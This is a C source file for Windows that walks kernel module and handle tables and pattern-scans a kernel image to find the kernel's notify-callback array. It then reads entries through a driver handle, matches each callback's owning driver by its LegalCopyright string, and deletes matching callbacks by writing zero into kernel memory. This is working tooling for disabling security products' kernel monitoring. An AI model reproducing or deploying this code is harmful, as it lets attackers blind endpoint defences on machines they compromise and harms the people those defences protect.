#include "struct.h"
PRTL_PROCESS_MODULES moduleInfos = NULL;
BOOL needSort = TRUE;

NTSTATUS GetGlobalProcessInformation(PVOID buffer)
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	DWORD cbNeed;
	for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (*(PVOID*)buffer = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQuerySystemInformation(SystemProcessInformation, *(PVOID*)buffer, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(*(PVOID*)buffer);
	}
	return status;
}
BOOL GetTargetObjectAddress(PSYSTEM_HANDLE_INFORMATION buffer, DWORD UniqueProcess, HANDLE handleValue, PVOID object, UCHAR typeIndex)
{
	BOOL status = FALSE;

	for (ULONG i = 0; i < buffer->NumberOfHandles; i++)
	{
		if (buffer->Handles[i].UniqueProcessId == UniqueProcess && buffer->Handles[i].ObjectTypeIndex == typeIndex  && buffer->Handles[i].HandleValue == (USHORT)handleValue)
		{
			*(PVOID*)object = buffer->Handles[i].Object;
			status = TRUE;
			break;
		}
	}

	return status;
}
BOOL GetHandleTypeIndex(PSYSTEM_HANDLE_INFORMATION buffer, PUCHAR HandleTypeIndex, PWSTR wStr, DWORD cId)
{
	BOOL result = FALSE;
	NTSTATUS status;
	ULONG i = 0, cbNeed = 0;
	POBJECT_TYPE_INFORMATION typeInfo = NULL;
	UNICODE_STRING uType;

	RtlInitUnicodeString(&uType, wStr);
	for (i = 0; i < buffer->NumberOfHandles; i++)
	{
		if (buffer->Handles[i].UniqueProcessId == cId)
		{
			status = ZwQueryObject(ULongToHandle(buffer->Handles[i].HandleValue), ObjectTypeInformation, NULL, 0, &cbNeed);
			if (status == STATUS_INFO_LENGTH_MISMATCH)
			{
				if (typeInfo = LocalAlloc(LPTR, cbNeed))
				{
					status = ZwQueryObject(ULongToHandle(buffer->Handles[i].HandleValue), ObjectTypeInformation, typeInfo, cbNeed, &cbNeed);
					if (NT_SUCCESS(status))
					{
						if (RtlEqualUnicodeString(&uType, &typeInfo->TypeName, FALSE))
						{
							*HandleTypeIndex = typeInfo->TypeIndex;
							LocalFree(typeInfo);
							result = TRUE;
							break;
						}
					}
					LocalFree(typeInfo);
				}
			}

		}
	}
	return result;
}

NTSTATUS GetGlobalHandleTable(PVOID* handletable)
{
	DWORD cbNeed;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (*(PVOID*)handletable = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQuerySystemInformation(SystemHandleInformation, *(PVOID*)handletable, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(*(PVOID*)handletable);
	}
	return status;
}

NTSTATUS enumDriver()
{

	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	DWORD cbNeed;
	for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (moduleInfos = LocalAlloc(LPTR, cbNeed));)
	{
		status = NtQuerySystemInformation(SystemModuleInformation, moduleInfos, cbNeed, &cbNeed);
		if (!NT_SUCCESS(status))
			LocalFree(moduleInfos);
	}

	return status;
}
void SortDevice()
{
	DWORD i, j;
	RTL_PROCESS_MODULE_INFORMATION temp;

	for (i = 0; i < moduleInfos->NumberOfModules - 1; i++)
	{
		for (j = 0; j < moduleInfos->NumberOfModules - 1 - i; j++)
		{
			if (moduleInfos->Modules[j].ImageBase > moduleInfos->Modules[j + 1].ImageBase)
			{
				temp = moduleInfos->Modules[j];
				moduleInfos->Modules[j] = moduleInfos->Modules[j + 1];
				moduleInfos->Modules[j + 1] = temp;
			}
		}
	}
	needSort = FALSE;
}


BOOL GetGlobalAddress(PSTR ModuleName, PSTR StartFunction, PSTR endFunction, PUCHAR pattern, DWORD dwPattern, LONG offset, ULONG_PTR* globalAddress)
{

	HMODULE hModule = NULL;
	DWORD Patternoffset = 0, i, count;
	PVOID StartAddress, endAddress;
	BOOL result = FALSE;
	PIMAGE_DOS_HEADER pImageDos = NULL;
	PIMAGE_NT_HEADERS pNtHeader = NULL;

	if (hModule = LoadLibraryExA(ModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES))
	{
		if (StartFunction)
			StartAddress = GetProcAddress(hModule, StartFunction);
		else StartAddress = hModule;

		if (endFunction)
			endAddress = GetProcAddress(hModule, endFunction);
		else
		{
			pNtHeader =(PIMAGE_NT_HEADERS)((PBYTE)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
			endAddress = (PBYTE)hModule + pNtHeader->OptionalHeader.SizeOfImage - dwPattern;
	
		}
		if ((PBYTE)endAddress > (PBYTE)StartAddress)
		{
			for (count = 0; count < (DWORD)((PBYTE)endAddress - (PBYTE)StartAddress); count++)
			{

				if (RtlEqualMemory((PBYTE)StartAddress + count, pattern, dwPattern))
				{

					Patternoffset = *(PDWORD)((PBYTE)StartAddress + count + offset);
					break;
				}
			}
		}
		else PRINT_ERROR(L"endAddress %p, startAddress %p,endAddress need greater than  startAddress\n", endAddress, StartAddress);

		if (Patternoffset)
		{
			for (i = 0; i < moduleInfos->NumberOfModules; i++)
			{
				if (StrStrIA(moduleInfos->Modules[i].FullPathName, ModuleName))
				{

					*globalAddress = ((ULONG_PTR)moduleInfos->Modules[i].ImageBase & 0xFFFFFFFF00000000) + (((ULONG_PTR)moduleInfos->Modules[i].ImageBase + count + (PBYTE)StartAddress - (PBYTE)hModule + Patternoffset + 4 + offset) & 0xFFFFFFFF);
					result = TRUE;
					break;
				}
			}
		}
		else PRINT_ERROR(L"FindPattern\n");
		FreeLibrary(hModule);
	}
	else  PRINT_ERROR(L"LoadLibraryExA %d\n", GetLastError());
	return result;
}

BOOL GetPhyPath(PSTR ntPath, PWSTR* DosPath)
{
	BOOL status = FALSE;
	DWORD len = 0;
	PWSTR DriverName = NULL, ByteNtPathBuffer = NULL;
	RTL_UNICODE_STRING_BUFFER buffer;
	PSTR temp;
	wchar_t env[MAX_PATH];

	*DosPath = NULL;
	if (strstr(ntPath, "??"))
	{

		len = MultiByteToWideChar(CP_ACP, MB_COMPOSITE, ntPath, -1, NULL, 0);
		if ((DriverName = LocalAlloc(LPTR, len * sizeof(wchar_t))) &&
			(*DosPath = LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t))) &&
			(ByteNtPathBuffer = LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t))))
		{
			MultiByteToWideChar(CP_ACP, MB_COMPOSITE, ntPath, -1, DriverName, len);
			RtlInitUnicodeString(&buffer.String, DriverName);

			RtlCopyMemory(*DosPath, buffer.String.Buffer, buffer.String.Length);
			RtlCopyMemory(ByteNtPathBuffer, buffer.String.Buffer, buffer.String.Length);
			buffer.ByteBuffer.Buffer = (PUCHAR)(*DosPath);
			buffer.ByteBuffer.StaticBuffer = (PUCHAR)ByteNtPathBuffer;
			buffer.ByteBuffer.Size = buffer.String.Length;
			buffer.ByteBuffer.StaticSize = buffer.String.Length;
			if (NT_SUCCESS(RtlNtPathNameToDosPathName(0, &buffer, NULL, NULL)))
			{
				status = TRUE;
			}
			else
			{
				LocalFree(*DosPath);
				wprintf(L"RtlNtPathNameToDosPathName");
			}
			LocalFree(DriverName);
			LocalFree(ByteNtPathBuffer);
		}
	}
	else if (temp = StrStrIA(ntPath, "systemroot"))
	{
		RtlSecureZeroMemory(env, sizeof(env));
		GetEnvironmentVariableW(L"SystemRoot", env, MAX_PATH);
		len = lstrlenW(env) + lstrlenA(temp);
		len = len * sizeof(wchar_t);
		if (*DosPath = LocalAlloc(LPTR, len))
		{
			wsprintfW(*DosPath, L"%ws%hs", env, temp + 10);
			status = TRUE;
		}
	}


	return status;
}


BOOL checkDriver(HANDLE hDevice, ULONG_PTR routeAddress, ULONG_PTR funcAddress, PWSTR LegalCopyrightName,PWSTR NotifyName, BOOL needWrite)
{
	DWORD i, VerinfoSize = 0;
	PWSTR DosPath = NULL, subBlock = NULL;
	PVOID pBuf = NULL;
	PDWORD pTransTable = NULL;
	UINT cbTranslate = 0;
	PWSTR pVsInfo = NULL;
	BOOL status = FALSE;

	if (funcAddress & ~(ULONG_PTR)0xFFFFFFFFFFFF) //Make Sure this is a Kernel point
	{
		for (i = 0; i < moduleInfos->NumberOfModules; i++)
		{
			if (funcAddress < (ULONG_PTR)moduleInfos->Modules[i].ImageBase)
			{
				//wprintf(L"%p %p %p %hs\n", funcAddress, moduleInfos->Modules[i - 1].ImageBase, moduleInfos->Modules[i].ImageBase, moduleInfos->Modules[i - 1].FullPathName);
				break;
			}
		}

		if (i != moduleInfos->NumberOfModules - 1)
		{
			i -= 1;
			if (GetPhyPath(moduleInfos->Modules[i].FullPathName, &DosPath))
			{
				if (VerinfoSize = GetFileVersionInfoSizeW(DosPath, 0))
				{
					if ((pBuf = LocalAlloc(LPTR, VerinfoSize + 1)) && (subBlock = LocalAlloc(LPTR, 256)))
					{
						if (GetFileVersionInfoW(DosPath, 0, VerinfoSize, pBuf))
						{
							if (VerQueryValueW(pBuf, L"\\VarFileInfo\\Translation", (LPVOID*)&pTransTable, &cbTranslate))
							{

								if (VerQueryValueW(pBuf, L"\\VarFileInfo\\Translation", (LPVOID*)&pTransTable, &cbTranslate))
								{
									i = 0;
									while (i < cbTranslate / sizeof(DWORD))
									{
										wsprintfW(subBlock, L"\\StringFileInfo\\%04x%04x\\LegalCopyright", LOWORD(*(&pTransTable[i])), HIWORD(*(&pTransTable[i])));

										if (VerQueryValueW(pBuf, subBlock, (LPVOID*)&pVsInfo, &cbTranslate))
										{
											if (StrStrIW(pVsInfo, LegalCopyrightName))
											{
												if (needWrite)
												{
													wprintf(L"[*] Delete %ws @ %I64X; In %ws\n", NotifyName, funcAddress, wcsrchr(DosPath, L'\\') + 1);
													UtilWriteKernelMemory(hDevice, routeAddress, 0);
												}
												status = TRUE;
											}
											else wprintf(L"\t%I64X ;In %ws\n", funcAddress, wcsrchr(DosPath, L'\\') + 1);
										}
										else break;
										i++;
									}
								}
							}
						}
						LocalFree(pBuf);
						LocalFree(subBlock);
					}
				}
				LocalFree(DosPath);
			}
		}
	}
	return status;
}

void DeleteRegistryCallBack(void(*callback)(void* info), PINFORMATION pInfor, PWSTR Copyright, PWSTR Routine, PWSTR Notify)
{
	NTSTATUS status;
	ULONG_PTR NotifyArray, eachCallBack, NotifyFuncAddress;


	callback(pInfor);

	if (!moduleInfos)
	{
		status = enumDriver();
		if (!NT_SUCCESS(status))
		{
			PRINT_ERROR(L"enumDriver %08x\n", status);
			return;
		}
	}

	if (needSort)
		SortDevice();

	if (GetGlobalAddress(pInfor->Notify.ModuleName, pInfor->Notify.startFunc, pInfor->Notify.endFunc, pInfor->Notify.Pattern, pInfor->Notify.dwPattern, pInfor->Notify.offset, &NotifyArray))
	{
		wprintf(L"[*] %ws @ %I64X\n", Routine, NotifyArray);
		for (USHORT i = 0; i < 64; i++)
		{
			if (UtilReadKernelMemory(pInfor->hDevice, NotifyArray + (i * sizeof(PVOID)), &eachCallBack))
			{

				if (!eachCallBack)
					continue;
				eachCallBack &= ~7;

				if (UtilReadKernelMemory(pInfor->hDevice, eachCallBack, &NotifyFuncAddress))
				{
					checkDriver(pInfor->hDevice, NotifyArray + (i * sizeof(PVOID)), NotifyFuncAddress, Copyright, Notify, TRUE);
				}
			}
			else break;
		}
	}
}